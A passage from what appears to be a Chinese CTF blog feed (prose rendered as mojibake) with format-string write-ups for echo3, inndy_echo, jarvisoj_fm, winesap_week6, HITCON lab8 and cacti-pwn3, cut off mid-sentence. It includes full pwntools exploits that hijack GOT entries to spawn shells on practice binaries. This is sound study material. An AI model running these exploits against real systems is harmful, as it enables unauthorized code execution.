alt><br>ä¼šå‘ç°è¿™ä¸ªæƒ…å†µæ˜¯æ²¡æœ‰<strong>æ„æˆebpé“¾</strong>çš„ï¼Œè¿™ä¸ªæ—¶å€™å°±éœ€è¦å’±ä»¬è‡ªå·±æ¥ä»”ç»†è§‚å¯Ÿæ ˆä¸Šçš„æ•°æ®ï¼Œç„¶åæ¥æŒ‘é€‰åˆé€‚çš„æ ˆæ•°æ®æ¥è¿›è¡Œåˆ©ç”¨ã€‚</p><p>å› ä¸ºæ ˆæƒ…å†µä¸ä¸€æ ·ï¼Œå¯ä»¥é€‰æ‹©æœ€é€‚åˆæˆ‘ä»¬åˆ©ç”¨æ¼æ´çš„æ ˆç©ºé—´æ¥è¿›è¡Œåˆ†æï¼Œè¿™æ ·åšèµ·æ¥ä¼šç®€å•ä¸€äº›ã€‚</p><p>æˆ‘è‡ªå·±é€‰æ‹©åœ¨åç§»åœ¨43çš„æ—¶å€™å¼€å§‹è¿›è¡Œåˆ†æï¼Œæƒ³åŠæ³•æ¥åˆ©ç”¨è¿™ä¸ªæ¼æ´ï¼š<br><img src="http://qiqianyun.chumen77.xyz/uPic/8gciU0.png" srcset="/img/loading.gif" alt><br>ä»”ç»†çœ‹ä¸‹æ­¤æ—¶çš„æ ˆæƒ…å†µ ï¼Œç„¶åå†æ¬¡ä»”ç»†åˆ†æä¸‹æˆ‘ä»¬çš„ç›®æ ‡ ï¼š</p><ul><li>æ³„æ¼libcåŸºå€ï¼Œè®¡ç®—å‡ºsystemçš„å†…å­˜åœ°å€ã€‚</li><li>åœ¨æ ˆä¸Šæ„é€ å‡ºprintfçš„gotåœ°å€å’Œprintfçš„got+2çš„åœ°å€ï¼ˆ0x0804a014å’Œ0x0804a016ï¼‰</li><li>åœ¨æ„é€ çš„gotåœ°å€ä¸Šï¼Œå¼€å§‹å†™systemåœ°å€<br>ç”±äºè¿™ä¸ªæ¼æ´å¯ä»¥çš„ç”¨çš„æ¬¡æ•°æœ€å¤šæ˜¯4æ¬¡ï¼Œæ‰€ä»¥è¦å°½å¯èƒ½åˆ©ç”¨æ¯ä¸€æ¬¡ã€‚</li></ul><p>å¦‚ä¸Šå›¾æ‰€ç¤ºï¼Œå¾ˆç®€å•å°±å¯ä»¥æ³„æ¼å‡ºlibcåŸºå€ã€‚<br>ä½†æ˜¯æ¥ä¸‹æ¥æ€ä¹ˆæ„é€ printfçš„gotåœ°å€å’Œprintfçš„gotåœ°å€+2çš„åœ°å€å°±æœ‰ç‚¹éš¾äº†ã€‚</p><p>æ­¤æ—¶æ³¨æ„å›¾ä¸Šå‰ä¸¤ä¸ªçº¢æ¡†ï¼Œå¯ä»¥å‘ç°æŠŠå‰äºŒä¸ªçº¢æ¡†<strong>è™½ä¸æ˜¯ebp</strong>çš„é“¾ï¼Œä½†æ˜¯è¿™ä¹Ÿæ˜¯<strong>æˆä¸€ä¸ªé“¾</strong>å¯ä»¥åˆ©ç”¨äº†ã€‚ç„¶åå¯ä»¥æŠŠç¬¬äºŒä¸ªçº¢æ¡†çš„ä¸¤ä¸ªåœ°å€ä¿®æ”¹ä¸º ç¬¬ä¸€ä¸ªçº¢æ¡†çš„ä¸¤ä¸ªæ ˆæŒ‡é’ˆï¼š</p><p>è¿™é‡Œå¯ä»¥ç”¨gdbç›´æ¥æ¥æ‰‹åŠ¨è®¾ç½®ï¼Œè®©å’±ä»¬ä¸Šæ¥å°±å†™expè°ƒè¯•è¿˜æ˜¯æŒºè´¹åŠ²çš„ï¼š</p><pre><code>gdb-peda$ set *0xffbe5e6c = 0xffbe5d54gdb-peda$ set *0xffbe5e64 = 0xffbe5d60</code></pre><p><img src="http://qiqianyun.chumen77.xyz/uPic/KIrnCk.png" srcset="/img/loading.gif" alt></p><p>è¿™ä¸ªè¿‡ç¨‹ä¸­åœ¨æ³„æ¼ç›®æ ‡æ ˆåœ°å€ä»¥åï¼Œæ˜¯å¯ä»¥é€šè¿‡ä¸€æ¬¡printfå‡½æ•°å†™å…¥2æ¬¡åœ°å€ï¼Œå®ç°è¿™ä¸ªæ ˆæƒ…å†µçš„ã€‚</p><p>æ¥ç€å°±å¯ä»¥æ„é€ gotåœ°å€å’Œgot+2åœ°å€ï¼š</p><pre><code>gdb-peda$ set *0xffbe5d60  = 0x0804a016gdb-peda$ set *0xffbe5d54  = 0x0804a014</code></pre><p><img src="http://qiqianyun.chumen77.xyz/uPic/hma5RY.png" srcset="/img/loading.gif" alt></p><p>ç„¶åå°±å¯ä»¥åˆ©ç”¨å¯¹gotåœ°å€å’Œgot+2åœ°å€ä½¿ç”¨<code>%xhn</code>,å†™systemçš„å†…å­˜åœ°å€ä¸Šprintfçš„gotäº†ï¼š</p><pre><code>0120| 0xffbe5d88 --&gt; 0xffbe5e6c --&gt; 0xffbe5d54 --&gt; 0x804a014 --&gt; 0xf7e0cda0 (&lt;__libc_system&gt;:    sub    esp,0xc)</code></pre><p>å†™å¥½ä»¥åï¼Œå†ä¼ è¿‡å»ä¸€ä¸‹<code>/bin/sh</code>å³å¯ã€‚</p><h4 id="exp-4"><a href="#exp-4" class="headerlink" title="exp"></a>exp</h4><pre><code class="python">from pwn import *context.log_level = &#39;debug&#39;context.arch =&#39;i386&#39;import timeelf = ELF(&#39;./echo3&#39;)debug = 1while True:    if debug :        io = process(&#39;./echo3&#39;)        libc = elf.libc    else:        io = remote(&#39;node3.buuoj.cn&#39;,25057)        libc = ELF(&#39;./libc-2.23.so.i386&#39;)    payload = &#39;%43$pA%30$pA%47$p&#39;    io.sendline(payload)    address = io.recvline().strip()    if address[-3:] == &#39;637&#39;:        if address[7:10] == &#39;637&#39;:            libc_base = int(address[2:10],16) - 247 - libc.symbols[&#39;__libc_start_main&#39;]            tag1_stack_point = int(address[13:21],16) - 0x118            tag2_stack_point = int(address[13:21],16) - 0x104 - 0x8            system_addr = libc_base + libc.symbols[&#39;system&#39;]            print(&#39;system_addr  -&gt;&#39; + hex(system_addr))            print(&#39;tag1_stack_point -&gt;&#39; + hex(tag1_stack_point))            print(&#39;tag2_stack_point -&gt;&#39; + hex(tag2_stack_point))            break    else :        io.close()        continuedef fmtshort(prev,val,idx,byte = 2):    result = &quot;&quot;    if prev &lt; val :        result += &quot;%&quot; + str(val - prev) + &quot;c&quot;    elif prev == val :        result += &#39;&#39;    else :        result += &quot;%&quot; + str(256**byte - prev + val) + &quot;c&quot;    result += &quot;%&quot; + str(idx) + &quot;$hn&quot;    return resultdef fmtbyte(prev,val,idx,byte = 1):    result = &quot;&quot;    if prev &lt; val :        result += &quot;%&quot; + str(val - prev) + &quot;c&quot;    elif prev == val :        result += &#39;&#39;    else :        result += &quot;%&quot; + str(256**byte - prev + val) + &quot;c&quot;    result += &quot;%&quot; + str(idx) + &quot;$hhn&quot;    return resultprintf_got = 0x0804a014key1 = int(hex(tag1_stack_point)[-4:],16)key2 = int(hex(tag2_stack_point)[-4:],16)info(&#39;--------change the two points to tag_stack_point:-------&#39;)# raw_input(&#39;-&gt;&#39;)prev = 0payload = &quot;&quot;for i in range(1):    payload +=fmtshort(prev,(key1 &gt;&gt; 16*i) &amp; 0xffff,30+i)     prev = (key1 &gt;&gt; i*16) &amp; 0xfffffor i in range(1):    payload +=fmtshort(prev,(key2 &gt;&gt; 16*i) &amp; 0xffff,31+i)     prev = (key2 &gt;&gt; i*16) &amp; 0xffffpayload = payload + &#39;1111&#39;io.sendline(payload)io.recvuntil(&#39;1111&#39;)info(&#39;--------change got_table to printf_got:-------&#39;)prev = 0 payload = &quot;&quot;key3 = 0x14key4 = 0x16for i in range(1):    payload +=fmtbyte(prev,(key3 &gt;&gt; 8*i) &amp; 0xff,87+i)     prev = (key3 &gt;&gt; i*8) &amp; 0xfffor i in range(1):    payload +=fmtbyte(prev,(key4 &gt;&gt; 8*i) &amp; 0xff,85+i)     prev = (key4 &gt;&gt; i*8) &amp; 0xffpayload = payload + &#39;2222&#39;io.sendline(payload)io.recvuntil(&#39;2222&#39;)info(&#39;--------change printf_got to system_addr:-------&#39;)raw_input(&#39;-&gt;&#39;)prev = 0 payload = &quot;&quot;key5 = int(hex(system_addr)[-4:],16)key6 = int(hex(system_addr)[2:6],16)print(&#39;key5 -&gt; &#39; + hex(key5))print(&#39;key6 -&gt; &#39; + hex(key6))for i in range(1):    payload +=fmtshort(prev,(key5 &gt;&gt; 16*i) &amp; 0xffff,17+i)     prev = (key5 &gt;&gt; i*16) &amp; 0xfffffor i in range(1):    payload +=fmtshort(prev,(key6 &gt;&gt; 16*i) &amp; 0xffff,20+i)     prev = (key6 &gt;&gt; i*16) &amp; 0xffffpayload = payload + &#39;3333&#39;io.sendline(payload)sleep(1)io.recvuntil(&#39;3333&#39;)raw_input(&#39;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&#39;)io.sendline(&#39;/bin/sh\x00\x00\x00\x00\x00\x00&#39;)io.interactive()</code></pre><p>è¿™ä¸ªexpçš„éš¾ç‚¹åœ¨äºï¼š</p><ul><li>æ³¨æ„å»å®šä½åˆ°åˆé€‚çš„æ ˆç»“æ„å†å»åˆ©ç”¨</li><li>å°½é‡å……åˆ†åˆ©ç”¨æ¯ä¸€æ¬¡çš„printf</li><li>å•æ¬¡printfå¤šæ¬¡å†™å…¥</li><li>æ³¨æ„æ¯æ¬¡ä¼ æ•°æ®è¿‡å»åï¼Œä¸€å®šè¦æ¥æ”¶ä¸€ä¸‹ï¼Œå¹¶ä¸”å†ä¸€æ¬¡çš„æ•°æ®è¯»å…¥è¦é˜²æ­¢bssä¸Šçš„ç¼“å†²åŒºé‡Œé¢å‚æ‚æ•°æ®çš„å½±å“ã€‚</li></ul><h3 id="å°æ€»ç»“"><a href="#å°æ€»ç»“" class="headerlink" title="å°æ€»ç»“"></a>å°æ€»ç»“</h3><p>é€šè¿‡è¿™ä¸¤ä¸ªä¾‹é¢˜è¯´æ˜ï¼Œé¢å¯¹fmtçš„bufä¸åœ¨æ ˆä¸Šæ—¶ï¼Œå½’æ ¹ç»“åº•ä¹Ÿå°±æ˜¯ä¸€å®šè¦å­¦ä¼š<strong>çµæ´»ã€å……åˆ†çš„åˆ©ç”¨æ ˆä¸Šçš„æ•°æ®</strong>,å•çº¯çš„ebpé“¾åªæ˜¯é€‚åˆç®€å•çš„æƒ…å†µã€‚</p><p>ä½†æ˜¯ä¹Ÿæ˜¯åšé¢˜æ—¶ï¼Œä¹Ÿæ˜¯ä¸€å®šè¦ä¼˜å…ˆè€ƒè™‘ebpé“¾æ˜¯å¦èƒ½åˆ©ç”¨ï¼Œå› ä¸ºebpé“¾æ„æˆçš„è¯ï¼Œå®ƒçš„ç›¸å¯¹åç§»å°±æ˜¯<strong>é’ˆå¯¹æ€§ç¨‹åºæœ¬èº«çš„</strong>ï¼ŒåŸºæœ¬ä¸ä¼šå—åˆ°libcç‰ˆæœ¬çš„å½±å“ï¼Œç”¨èµ·æ¥å¾ˆå¥½ç”¨ï¼Œè¦ä¼˜å…ˆè€ƒè™‘ã€‚</p><p>è¿˜æœ‰å°±æ˜¯é¢å¯¹è¿™ç§ä¼š<strong>æœ‰éšæœºæ ˆæƒ…å†µã€æ²¡æœ‰ebpé“¾</strong>çš„é¢˜ç›®ï¼Œä¸€å®šè¦æ³¨æ„æœ¬åœ°å’Œè¿œç¨‹çš„libcç‰ˆæœ¬ã€æ³¨æ„ç¯å¢ƒ,å› ä¸ºè¿™äº›ä¸ä¸€æ ·å¯¼è‡´æ ˆçš„æƒ…å†µä¹Ÿæ˜¯ä¸ä¸€æ ·çš„ï¼Œå¯¼è‡´expä¹Ÿè¦æœ‰ç›¸åº”çš„å˜åŒ–ã€‚</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;æ ¼å¼åŒ–å­—ç¬¦ä¸²æ¼æ´å°æ€»ç»“ï¼ˆä¸‹ï¼‰&quot;&gt;&lt;a href=&quot;#æ ¼å¼åŒ–å­—ç¬¦ä¸²æ¼æ´å°æ€»ç»“ï¼ˆä¸‹ï¼‰&quot; class=&quot;headerlink&quot; title=&quot;æ ¼å¼åŒ–å­—ç¬¦ä¸²æ¼æ´å°æ€»ç»“ï¼ˆä¸‹ï¼‰&quot;&gt;&lt;/a&gt;æ ¼å¼åŒ–å­—ç¬¦ä¸²æ¼æ´å°æ€»ç»“ï¼ˆä¸‹ï¼‰&lt;/h1&gt;&lt;h2 id=&quot;å‰è¨€&quot;&gt;&lt;a href=&quot;#å‰è¨€&quot;
      
    
    </summary>
    
    
      <category term="pwn" scheme="http://chumen77.xyz/tags/pwn/"/>
    
      <category term="å­¦ä¹ è®°å½•" scheme="http://chumen77.xyz/tags/%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/"/>
    
  </entry>
  
  <entry>
    <title>æ ¼å¼åŒ–å­—ç¬¦ä¸²æ¼æ´é¢˜ç›®ç»ƒä¹ </title>
    <link href="http://chumen77.xyz/2020/03/15/%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E6%BC%8F%E6%B4%9E%E9%A2%98%E7%9B%AE%E7%BB%83%E4%B9%A0/"/>
    <id>http://chumen77.xyz/2020/03/15/æ ¼å¼åŒ–å­—ç¬¦ä¸²æ¼æ´é¢˜ç›®ç»ƒä¹ /</id>
    <published>2020-03-15T06:38:15.000Z</published>
    <updated>2020-06-26T03:43:20.333Z</updated>
    
    <content type="html"><![CDATA[<h1 id="æ ¼å¼åŒ–å­—ç¬¦ä¸²æ¼æ´é¢˜ç›®ç»ƒä¹ "><a href="#æ ¼å¼åŒ–å­—ç¬¦ä¸²æ¼æ´é¢˜ç›®ç»ƒä¹ " class="headerlink" title="æ ¼å¼åŒ–å­—ç¬¦ä¸²æ¼æ´é¢˜ç›®ç»ƒä¹ "></a>æ ¼å¼åŒ–å­—ç¬¦ä¸²æ¼æ´é¢˜ç›®ç»ƒä¹ </h1><h2 id="å‰è¨€"><a href="#å‰è¨€" class="headerlink" title="å‰è¨€"></a>å‰è¨€</h2><p>æ•´åˆä¸€ä¸‹æœ€è¿‘åšçš„æ ¼å¼åŒ–å­—ç¬¦ä¸²é¢˜ç›®çš„ç»ƒä¹ ï¼ŒæŠŠwpç»™å†™ä¸€ä¸‹ï¼Œæ–¹ä¾¿å¯¹æ€»ç»“å¯¹è¿™ä¸ªæ¼æ´çš„åˆ©ç”¨å¥—è·¯å’ŒæŠ€å·§ã€‚</p><h2 id="inndy-echo"><a href="#inndy-echo" class="headerlink" title="inndy_echo"></a>inndy_echo</h2><h3 id="ä¿æŠ¤å’Œarch"><a href="#ä¿æŠ¤å’Œarch" class="headerlink" title="ä¿æŠ¤å’Œarch"></a>ä¿æŠ¤å’Œarch</h3><pre><code>[*] &#39;/media/psf/mypwn2/buuctf/inndy_echo/echo&#39;    Arch:     i386-32-little    RELRO:    Partial RELRO    Stack:    No canary found    NX:       NX enabled    PIE:      No PIE (0x8048000)</code></pre><h3 id="idaåˆ†æ"><a href="#idaåˆ†æ" class="headerlink" title="idaåˆ†æ"></a>idaåˆ†æ</h3><pre><code class="c">int __cdecl __noreturn main(int argc, const char **argv, const char **envp){  char s; // [esp+Ch] [ebp-10Ch]  unsigned int v4; // [esp+10Ch] [ebp-Ch]  v4 = __readgsdword(0x14u);  setvbuf(stdin, 0, 2, 0);  setvbuf(stdout, 0, 2, 0);  do  {    fgets(&amp;s, 256, stdin);    printf(&amp;s);  }  while ( strcmp(&amp;s, &quot;exit\n&quot;) );  system(&quot;echo Goodbye&quot;);  exit(0);}</code></pre><p>å¯ä»¥çœ‹åˆ°ä¼šæ— é™çš„æ‰“å°ä½ è¾“å…¥çš„ä¸œè¥¿ï¼Œå¹¶ä¸”æœ‰systemè¿™ä¸ªå‡½æ•°ï¼Œåˆ©ç”¨æ€è·¯ä¹Ÿå°±æ˜¯GOT hijackï¼ŒæŠŠprintfå‡½æ•°çš„gotæ”¹ä¸ºsystemçš„pltï¼Œæ³¨æ„è¦å•æ¬¡printfå¤šæ¬¡å†™å…¥ï¼Œæ”¹ä¸ºsystemçš„pltåï¼Œå†ä¼ è¿‡å»<code>/bin/sh</code>ï¼Œæ­¤æ—¶å°±ä¼šå˜æˆ<code>system(/bin/sh)</code></p><h3 id="gdbè°ƒè¯•"><a href="#gdbè°ƒè¯•" class="headerlink" title="gdbè°ƒè¯•"></a>gdbè°ƒè¯•</h3><pre><code>gdb-peda$ stack 0x200000| 0xffffd250 --&gt; 0xffffd26c (&quot;AAAA\n&quot;)0004| 0xffffd254 --&gt; 0x1000008| 0xffffd258 --&gt; 0xf7fb25a0 --&gt; 0xfbad208b0012| 0xffffd25c --&gt; 0x00016| 0xffffd260 --&gt; 0xf7ffd000 --&gt; 0x23f400020| 0xffffd264 --&gt; 0x80482e7 (&quot;__libc_start_main&quot;)0024| 0xffffd268 --&gt; 0xf63d4e2e0028| 0xffffd26c (&quot;AAAA\n&quot;)</code></pre><pre><code class="c">gdb-peda$ fmtarg 0xffffd26cThe index of format argument : 7 (&quot;\%6$p&quot;)</code></pre><p>ç¡®å®šåç§»æ˜¯7ï¼Œæ‰“ç®—ä¸€ä¼šå†™payloadæ—¶å€™éœ€è¦è¡¥é½ï¼Œå°±<code>.ljust</code>è¡¥æˆ0x20çš„ï¼Œä¹Ÿå°±æ˜¯<code>offset = 7 + 0x20/4 = 15</code></p><h3 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h3><pre><code class="python">from pwn import *context.log_level = &#39;debug&#39;context.arch = &#39;i386&#39;# io = process(&#39;./echo&#39;)io = remote(&#39;node3.buuoj.cn&#39;,26990)system_plt = 0x08048400printf_got = 0x0804A010def fmt_short(prev,val,idx,byte = 2):    result = &quot;&quot;    if prev &lt; val :        result += &quot;%&quot; + str(val - prev) + &quot;c&quot;    elif prev == val :        result += &#39;&#39;    else :        result += &quot;%&quot; + str(256**byte - prev + val) + &quot;c&quot;    result += &quot;%&quot; + str(idx) + &quot;$hn&quot;    return resultprev = 0 payload = &quot;&quot;key = 0x08048400for i in range(2):    payload +=fmt_short(prev,(key &gt;&gt; 16*i) &amp; 0xffff,15+i)     prev = (key &gt;&gt; i*16) &amp; 0xffffpayload = payload.ljust(0x20,&#39;a&#39;) + p32(printf_got) + p32(printf_got+2)raw_input(&#39;-&gt;&#39;)io.sendline(payload)io.send(&#39;/bin/sh\x00&#39;)io.interactive()</code></pre><p>æ¢ä¸€ç§å°±æ˜¯ç”¨pwntoolsæ¨¡å—ï¼Œé¢å¯¹32ä½ï¼Œè¿™ç§æƒ…å†µè¿˜æ˜¯å¾ˆå¥½ç”¨çš„ï¼š</p><pre><code class="python">from pwn import *context.log_level = &#39;debug&#39;context.arch = &#39;i386&#39;# io = process(&#39;./echo&#39;)io = remote(&#39;node3.buuoj.cn&#39;,26990)system_plt = 0x08048400printf_got = 0x0804A010payload = fmtstr_payload(7,{printf_got : system_plt})io.sendline(payload)io.send(&#39;/bin/sh\x00&#39;)io.interactive()</code></pre><pre><code class="c">[DEBUG] Sent 0x3c bytes:    00000000  10 a0 04 08  11 a0 04 08  12 a0 04 08  13 a0 04 08  â”‚Â·Â·Â·Â·â”‚Â·Â·Â·Â·â”‚Â·Â·Â·Â·â”‚Â·Â·Â·Â·â”‚    00000010  25 32 34 30  63 25 37 24  68 68 6e 25  31 33 32 63  â”‚%240â”‚c%7$â”‚hhn%â”‚132câ”‚    00000020  25 38 24 68  68 6e 25 31  32 38 63 25  39 24 68 68  â”‚%8$hâ”‚hn%1â”‚28c%â”‚9$hhâ”‚    00000030  6e 25 34 63  25 31 30 24  68 68 6e 0a               â”‚n%4câ”‚%10$â”‚hhnÂ·â”‚â”‚    0000003c</code></pre><p>å¯ä»¥çœ‹ä¸€ä¸‹å…¶ç”Ÿæˆçš„payloadï¼ŒæŠŠç›®æ ‡åœ°å€ä¿¡æ¯æ”¾åœ¨å¼€å¤´ï¼Œåœ¨64ä½æ˜¯è‚¯å®šæ˜¯ä¸å¯è¡Œçš„ã€‚</p><h2 id="jarvisoj-fm"><a href="#jarvisoj-fm" class="headerlink" title="jarvisoj_fm"></a>jarvisoj_fm</h2><h3 id="idaåˆ†æ-1"><a href="#idaåˆ†æ-1" class="headerlink" title="idaåˆ†æ"></a>idaåˆ†æ</h3><pre><code class="c">int __cdecl main(int argc, const char **argv, const char **envp){  char buf; // [esp+2Ch] [ebp-5Ch]  unsigned int v5; // [esp+7Ch] [ebp-Ch]  v5 = __readgsdword(0x14u);  be_nice_to_people();  memset(&amp;buf, 0, 0x50u);  read(0, &amp;buf, 0x50u);  printf(&amp;buf);  printf(&quot;%d!\n&quot;, *(_DWORD *)&amp;x);  if ( *(_DWORD *)&amp;x != 4 )    return 0;  puts(&quot;running sh...&quot;);  system(&quot;/bin/sh&quot;);  return 0;}</code></pre><p>ååˆ†ç®€å•çš„é¢˜ç›®ï¼Œæ£€éªŒ x å€¼æ˜¯å¦ä¸º4ï¼Œå¦‚æœæ˜¯4ï¼ˆæ•°å­—ï¼‰ï¼Œå°±ç›´æ¥ç»™ä½ shelläº†ã€‚</p><h3 id="exp-1"><a href="#exp-1" class="headerlink" title="exp"></a>exp</h3><pre><code class="python">from pwn import *context.log_level = &#39;debug&#39;# io = process(&#39;./fm&#39;)io = remote(&#39;node3.buuoj.cn&#39;,26915)# io.recv()payload = p32(0x0804A02C) + &#39;%11$hn&#39;raw_input(&#39;-&gt;&#39;)io.sendline(payload)io.interactive()</code></pre><h2 id="winesap-week6"><a href="#winesap-week6" class="headerlink" title="winesap_week6"></a>winesap_week6</h2><h3 id="æºç ï¼š"><a href="#æºç ï¼š" class="headerlink" title="æºç ï¼š"></a>æºç ï¼š</h3><pre><code class="c">#include &lt;stdio.h&gt;int main() {    setvbuf(stdout, 0, _IONBF, 0);    alarm(180);    char str[100];    while(gets(str)) {        printf(str);    }    return 0;}</code></pre><p>éœ€è¦ç¼–è¯‘ä¸º64ä½ï¼Œè¿™ä¸ªé¢˜æ¯”èµ·æ¥ç¬¬ä¸€ä¸ªä¹Ÿå°±æ˜¯æ²¡æœ‰äº†systemå‡½æ•°ï¼Œéœ€è¦è‡ªå·±æ³„æ¼ä¸€ä¸‹libcçš„baseï¼Œç®—å‡ºsystemåœ°å€ï¼Œç„¶åè¿˜æ˜¯GOT hijackå°±å¯ä»¥äº†ã€‚</p><h3 id="EXP"><a href="#EXP" class="headerlink" title="EXP"></a>EXP</h3><pre><code class="python">from pwn import *import timecontext.arch = &#39;amd64&#39;context.log_level = &#39;debug&#39;io = process(&#39;./fmt1&#39;)elf = ELF(&#39;./fmt1&#39;)libc = elf.libcprintf_got = 0x0000601020io.sendline(&#39;%21$p&#39;)io.recvuntil(&#39;0x&#39;)libc_base = int((io.recv(12)),16) - 240 -libc.symbols[&#39;__libc_start_main&#39;]system_addr = libc_base + libc.symbols[&#39;system&#39;]print(&#39;leak_libc_base: &#39; + hex(libc_base))print(&#39;system_addr: &#39; + hex(system_addr))def fmt_short(prev,val,idx,byte = 2):    result = &quot;&quot;    if prev &lt; val :        result += &quot;%&quot; + str(val - prev) + &quot;c&quot;    elif prev == val :        result += &#39;&#39;    else :        result += &quot;%&quot; + str(256**byte - prev + val) + &quot;c&quot;    result += &quot;%&quot; + str(idx) + &quot;$hn&quot;    return resultprev = 0 payload = &quot;&quot;key = system_addrfor i in range(3):    payload +=fmt_short(prev,(key &gt;&gt; 16*i) &amp; 0xffff,12+i)     prev = (key &gt;&gt; i*16) &amp; 0xffffpayload = payload.ljust(0x30,&#39;a&#39;) + p64(printf_got) +p64(printf_got+2) + p64(printf_got+4)io.sendline(payload)sleep(1)io.sendline(&#39;/bin/sh\x00&#39;)io.interactive()</code></pre><h2 id="HITCON-Training-lab8"><a href="#HITCON-Training-lab8" class="headerlink" title="HITCON-Training-lab8"></a>HITCON-Training-lab8</h2><h3 id="æºç "><a href="#æºç " class="headerlink" title="æºç "></a>æºç </h3><pre><code class="c">#include &lt;stdio.h&gt;int magic = 0 ;int main(){    char buf[0x100];    setvbuf(stdout,0,2,0);    puts(&quot;Please crax me !&quot;);    printf(&quot;Give me magic :&quot;);    read(0,buf,0x100);    printf(buf);    if(magic == 0xda){        system(&quot;cat /home/craxme/flag&quot;);    }else if(magic == 0xfaceb00c){        system(&quot;cat /home/craxme/craxflag&quot;);    }else{        puts(&quot;You need be a phd&quot;);    }}</code></pre><p>ç¼–è¯‘ä¸º64ä½ã€‚</p><h3 id="åˆ†æ"><a href="#åˆ†æ" class="headerlink" title="åˆ†æ"></a>åˆ†æ</h3><p>ï¼ˆè¿™ä¸ªé¢˜ç›®æ˜¯çº¯ç²¹å°±æ˜¯ä¸ºäº†ç»ƒä¹ ä»»æ„åœ°å€å†™å…¥çš„ï¼Œæˆ‘è¿™é‡Œå°±ç›´æ¥å†™expæ‹¿sheeläº†ã€‚ï¼‰å¯ä»¥çœ‹åˆ°å½“å†ä¸€æ¬¡printfï¼Œä¹‹åç¨‹åºä¾¿åœæ­¢äº†ï¼Œä¸”ç»“æŸå‰æœ‰putså‡½æ•°ã€‚<br>æ€è·¯å°±æ˜¯å¯ä»¥GOT hijack putå‡½æ•°çš„GOTä¸ºreadå‡½æ•°å“ªé‡Œï¼Œè®©å…¶call putså‡½æ•°æ—¶è¿”å›åˆ°readå‡½æ•°ï¼Œå¹¶ä¸”åœ¨è¿™æ¬¡printfå‡½æ•°æ¼æ´åˆ©ç”¨æ—¶ï¼Œä¹ŸæŠŠprintfå‡½æ•°çš„GOTæ”¹ä¸ºsystemçš„pltï¼Œç„¶åä¼ å…¥<code>/bin/sh</code>å³å¯ã€‚</p><h3 id="exp-2"><a href="#exp-2" class="headerlink" title="exp"></a>exp</h3><pre><code class="python">from pwn import *context.log_level = &#39;debug&#39;context.arch = &#39;amd64&#39;io = process(&#39;./craxme&#39;)# io = remote(&#39;127.0.0.1&#39;,8888)magic = 0x0000060106Cio.recvuntil(&#39;:&#39;)system_plt = 0x04005A0puts_got = 0x0601018ret_addr = 0x00400747printf_got = 0x00601030key = 0x00400747key2 = 0x04005A0def fmt_short(prev,val,idx,byte = 2):    result = &quot;&quot;    if prev &lt; val :        result += &quot;%&quot; + str(val - prev) + &quot;c&quot;    elif prev == val :        result += &#39;&#39;    else :        result += &quot;%&quot; + str(256**byte - prev + val) + &quot;c&quot;    result += &quot;%&quot; + str(idx) + &quot;$hn&quot;    return resultprev = 0 payload = &quot;&quot;for i in range(3):    payload +=fmt_short(prev,(key &gt;&gt; 16*i) &amp; 0xffff,26+i)     prev = (key &gt;&gt; i*16) &amp; 0xfffffor i in range(3):    payload +=fmt_short(prev,(key2 &gt;&gt; 16*i) &amp; 0xffff,29+i)     prev = (key2 &gt;&gt; i*16) &amp; 0xffffpayload = payload.ljust(0x80+0x20,&#39;a&#39;) + flat([puts_got,puts_got+2,puts_got+4,printf_got,printf_got+2,printf_got+4])io.sendline(payload)io.interactive()</code></pre><h2 id="cacti-pwn3"><a href="#cacti-pwn3" class="headerlink" title="cacti-pwn3"></a>cacti-pwn3</h2><h3 id="ä¿æŠ¤å’Œarch-1"><a href="#ä¿æŠ¤å’Œarch-1" class="headerlink" title="ä¿æŠ¤å’Œarch"></a>ä¿æŠ¤å’Œarch</h3><pre><code class="python">[*] &#39;/media/psf/mypwn2/ctf_wiki/fmt/cctf/pwn3&#39;    Arch:     i386-32-little    RELRO:    Partial RELRO    Stack:    No canary found    NX:       NX enabled    PIE:      No PIE (0x8048000)</code></pre><h3 id="idaåˆ†æ-2"><a href="#idaåˆ†æ-2" class="headerlink" title="idaåˆ†æ"></a>idaåˆ†æ</h3><p>è¿™ä¸ªé¢˜æ¨¡æ‹Ÿäº†ä¸€ä¸ªftpæœåŠ¡ã€‚<br><img src="http://qiqianyun.chumen77.xyz/uPic/DH8PyF.png" srcset="/img/loading.gif" alt><br>è¿™é‡Œæ§åˆ¶çš„æ˜¯ç™»é™†ã€‚è¿›å…¥åˆ†æä¸€ä¸‹ï¼š</p><pre><code class="c">char *__cdecl ask_username(char *dest){  char src[40]; // [esp+14h] [ebp-34h]  int i; // [esp+3Ch] [ebp-Ch]  puts(&quot;Connected to ftp.hacker.server&quot;);  puts(&quot;220 Serv-U FTP Server v6.4 for WinSock ready...&quot;);  printf(&quot;Name (ftp.hacker.server:Rainism):&quot;);  __isoc99_scanf(&quot;%40s&quot;, src);  for ( i = 0; i &lt;= 39 &amp;&amp; src[i]; ++i )    ++src[i];  return strcpy(dest, src);}</code></pre><p>ç”¨æˆ·åå‡½æ•°ï¼Œå‘ç°å¯¹ä½ è¾“å…¥çš„ä¸œè¥¿è¿›è¡Œè¯¸ä½çš„è¿›è¡ŒåŠ ä¸€ã€‚</p><pre><code class="c">int __cdecl ask_password(char *s1){  if ( !strcmp(s1, &quot;sysbdmin&quot;) )    return puts(&quot;welcome!&quot;);  puts(&quot;who you are?&quot;);  exit(1);  return puts(&quot;welcome!&quot;);}</code></pre><p>ç”¨æˆ·å¯†ç å‡½æ•°ï¼Œå‘ç°è¦è·Ÿ<code>sysbdmin</code> è¿›è¡Œå¯¹æ¯”ï¼Œå¦‚æœä¸ç›¸ç­‰ï¼Œå°±ç›´æ¥é€€å‡ºã€‚<br>(strcmpå‡½æ•°å¯¹æ¯”ä¸¤ä¸ªå­—ç¬¦ä¸²æ—¶ï¼Œç›¸ç­‰è¿”å›0ï¼Œ!0 = éå‡ = çœŸï¼‰<br>æ‰€ä»¥è¿™ä¸ªç»•è¿‡å°±æ—¶sysbdmin è¯¸ä½å‡1å³å¯ã€‚<br><img src="http://qiqianyun.chumen77.xyz/uPic/tBKwyW.png" srcset="/img/loading.gif" alt><br>å‰©ä¸‹çš„å°±æ˜¯è¾“å…¥<code>get put 